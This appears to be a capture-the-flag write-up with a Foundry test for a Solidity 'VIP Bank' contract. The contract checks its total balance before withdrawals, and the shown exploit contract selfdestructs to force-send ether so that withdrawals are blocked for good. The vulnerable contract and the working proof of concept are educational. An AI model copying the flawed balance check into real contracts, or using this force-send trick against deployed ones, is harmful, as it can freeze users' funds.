## VIP Bank attack

The bank only accepts deposits **<= 0.05 ether** and can only hold a maximum of **0.5 ether**.
If the contract balance is greater than 0.5 ether it is not possible to withdraw anything.
```solidity
require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
```

To break the bank, we just need to bring the contract balance over 0.5 ETH. With a **selfdestruct** it is always possible to force send ether to an contract, even if it has no fallback or receive ether function.

To prove the attack, we just need an contract which we selfdestruct and force send the ether to the bank.

## Test
forge test --match-contract=VIPBankTest

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";

contract VIPBankTest is Test {

    address manager = 0x0000000000000000000000000000000000000001;
    address vip = 0x0000000000000000000000000000000000000002;
    address attacker = 0x0000000000000000000000000000000000000003;

    VIP_Bank public vipBank;

    function setUp() public {
        vm.prank(manager);
        vipBank = new VIP_Bank();

        vm.deal(manager, 5 ether);
        vm.deal(vip, 5 ether);
        vm.deal(attacker, 5 ether);
    }

    function testBlockTheBankFromWithdrawals() public {
        
        // check that manager is owner
        assertEq(manager, vipBank.manager());

        // add a vip
        vm.prank(manager);
        vipBank.addVIP(vip);

        uint256 startBalance = address(vipBank).balance;

        // check that we can deposit sth
        assertTrue(startBalance < 0.5 ether);

        // deposit some eth from vip
        vm.prank(vip);
        vipBank.deposit{value: 0.01 ether}();

        // deposit successful
        assertTrue(startBalance + 0.01 ether == address(vipBank).balance);

        // attacker breaks the withdraw
        vm.prank(attacker);
        new AttackTheBank{value: 0.6 ether}(address(vipBank));

        // bank now has more than 0.5 ether and withdraw will always break
        assertTrue(startBalance + 0.61 ether == address(vipBank).balance);

        vm.expectRevert(bytes("Cannot withdraw more than 0.5 ETH per transaction"));
        vm.prank(vip);
        vipBank.withdraw(0.01 ether);
    }
}

contract AttackTheBank {
    constructor(address bank) payable {
        selfdestruct(payable(bank));
    }
}

contract VIP_Bank{

    address public manager;
    mapping(address => uint) public balances;
    mapping(address => bool) public VIP;
    uint public maxETH = 0.5 ether;

    constructor() {
        manager = msg.sender;
    }

    modifier onlyManager() {
        require(msg.sender == manager , "you are not manager");
        _;
    }

    modifier onlyVIP() {
        require(VIP[msg.sender] == true, "you are not our VIP customer");
        _;
    }

    function addVIP(address addr) public onlyManager {
        VIP[addr] = true;
    }

    function deposit() public payable onlyVIP {
        require(msg.value <= 0.05 ether, "Cannot deposit more than 0.05 ETH per transaction");
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public onlyVIP {
        require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
        require(balances[msg.sender] >= _amount, "Not enough ether");
        balances[msg.sender] -= _amount;
        (bool success,) = payable(msg.sender).call{value: _amount}("");
        require(success, "Withdraw Failed!");
    }

    function contractBalance() public view returns (uint){
        return address(this).balance;
    }

}
```